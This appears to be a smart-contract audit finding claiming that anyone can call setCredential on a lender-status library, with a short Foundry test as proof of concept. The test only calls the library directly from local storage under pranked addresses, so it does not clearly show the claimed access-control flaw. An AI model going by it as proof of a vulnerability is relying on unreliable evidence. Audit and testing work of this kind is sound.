# Vulnerability details

## Impact
It makes it possible for an unauthorized person to set credentials.

## Proof of Concept
Place the below code snippet in your test file.

```javascript

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import "forge-std/Test.sol";
import "../src/types/LenderStatus.sol";
import {LibRoleProvider} from "../src/types/RoleProvider.sol";

contract LibLenderStatusTest is Test {
    using LibLenderStatus for LenderStatus;
    using LibRoleProvider for RoleProvider;

    LenderStatus status;
    RoleProvider provider;

    uint256 public timestamp;

    function setUp() public {
        //timestamp = block.timestamp;
    }

    function testAnyoneCanCallSetCredential() public {
        status.setCredential(provider, timestamp);

        address bob = address(0);
        vm.prank(bob);
        status.setCredential(provider, timestamp);
        vm.stopPrank();
        
        address bob2 = address(1);
        vm.prank(bob2);
        status.setCredential(provider, timestamp);
        vm.stopPrank();

        address bob3 = address(2);
        vm.prank(bob3);
        status.setCredential(provider, timestamp);
    }

}
```
